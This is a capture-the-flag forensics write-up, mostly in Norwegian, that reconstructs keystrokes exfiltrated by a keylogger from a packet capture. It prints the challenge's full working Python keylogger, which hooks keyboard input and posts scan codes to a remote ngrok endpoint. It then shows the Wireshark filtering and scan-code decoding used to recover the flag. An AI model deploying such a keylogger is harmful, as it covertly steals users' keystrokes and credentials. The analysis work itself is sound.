# Keyscanner
En gøy forensics oppgave med litt databehandling der man måtte integrere forståelse av nettverkslogger med et script som sender `http`-requests. 

# Oppgave av Vealending 
Our CSIRT recently discovered a keylogger running on one of our systems.
They've managed to capture the network traffic containing the keylogger's activity and the offending script itself.
Can you figure out what information was compromised?

# Løsning
Vi får nettverkstraffikken `capture.pcapng` og `Keylogger.py`. Ved å lese skriptet får vi informasjon om hvilken server keyloggingsaktiviteten ble sendt til. 
```python
import keyboard
import requests
import ctypes
import uuid
import os


class Logger:
    MAX_FILE_SIZE = 128
    APPDATA_FOLDER = os.getenv("APPDATA")
    FILE_NAME_PREFIX = "."
    FILE_NAME_SUFFIX = ".sc"
    REMOTE_SERVER = "http://c784-89-11-175-7.eu.ngrok.io/l0gg3r_3ndp0in7"
    REMOTE_HEADERS = {"Content-Type": "application/octet-stream"}

    def __init__(self):
        self.file_path = os.path.join(
            self.APPDATA_FOLDER,
            self.FILE_NAME_PREFIX + str(uuid.uuid4()) + self.FILE_NAME_SUFFIX,
        )
        self.file_size = 0

    def _get_layout(self):
        layout_name = ctypes.create_unicode_buffer(9)
        if ctypes.WinDLL("user32").GetKeyboardLayoutNameW(layout_name):
            return layout_name.value
        return None

    def _write_to_file(self, event):
        with open(self.file_path, "ab") as f:
            try:
                f.write(bytes([event.scan_code]))
            except ValueError:
                pass  # Discard extended scan codes

        self.file_size = os.path.getsize(self.file_path)

        if self.file_size >= self.MAX_FILE_SIZE:
            with open(self.file_path, "rb") as f:
                response = requests.post(
                    self.REMOTE_SERVER,
                    headers=self.REMOTE_HEADERS,
                    params={"layout": self._get_layout()},
                    data=f,
                )

            if response.status_code == 200:
                os.remove(self.file_path)

            self.file_path = os.path.join(
                self.APPDATA_FOLDER,
                self.FILE_NAME_PREFIX + str(uuid.uuid4()) + self.FILE_NAME_SUFFIX,
            )
            self.file_size = 0

    def start_logging(self):
        keyboard.hook(self._write_to_file)
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Logger()
    keylogger.start_logging()

```
Vi filtrerer slik `http.request.uri matches "/l0gg3r_3ndp0in7"` og lagrer datene som var tilsendt som plaintext. Deretter kan vi lettere utvinne all dataene og lagre det i en fil. For eksempel brukte jeg `cat data.txt | grep "0000  " -A 8 -B 0 > new.txt`.
Et eksempel packet inneholder også `layout` som beskriver hvilken keyboard layout var blitt brukt. Dette er nyttig for å dekryptere dataene ved skankodene.

Python-skriptet blir:
```python
scan_codes = {
    "02": "1",
    "03": "2",
    "04": "3",
    "05": "4",
    "06": "5",
    "07": "6",
    "08": "7",
    "09": "8",
    "0a": "9",
    "0b": "0",
    "0c": "+",
    "0d": "\\",
    "0e": "<"
    #... osv
}

with open('new.txt') as f:
	for line in f:
		if len(line) < 5: continue
		codes = line.split(' ')
		for code in codes:
			if len(code) > 2: continue
			try:
				print(scan_codes[code], end='')
			except:
				continue
```

```console
stange@ericjoshua key-scanner % python3 decrypt.py
kp *tabtabtabtabkp *SggSlloobablal  SsSsttraratteeggyy  SuuSpdpadatete a nandd  SuSuppccoommiinngg  SqqSuueeararttee<<<<<<<<<<aarrttererllyy S rSreevvee<<ieiwewenterenterSdSdeaerar  tetaea<<<<<<StSteaema m SmSmeemmererss<<<<<<bbererss,,enterenterenterenterSi iS hohoppee  tthihiss  memesssasabebe<<<<gege  fifindsnd sy you ou iinn  ggoooodd  hehaeatt<<llthth  anand d hihiggh h ssppiiriritsts.. S aSass w wee  aapppprrooaachch  tthhee  eenndd  ooff  tthhwee  uu<q<quueses<<<a<rartteerr<<rr..<<, , 
```
Den interessante delen viser flagget: `fflalgag^kp *77kp *^55cc44nnS-S-cc00dd3355S-S-44rr33S--S44ww335500mm33S11SS--SbbSuuS77S--Scc44SSSnnS<<<<<<ccS44S<<44SnnSS--SSyyS00uuS--Srr3344SddSS-S-55pepecc1144SlSl<<<<<<<<<<33cc1144SllSS--SccShhS44rr44cc7733SrSr55S++SS3S3..--,,S11SS--S--,,..S++S^kp *00kp *^`

En del av det er `flag{5c4n_c0d35_` osv.


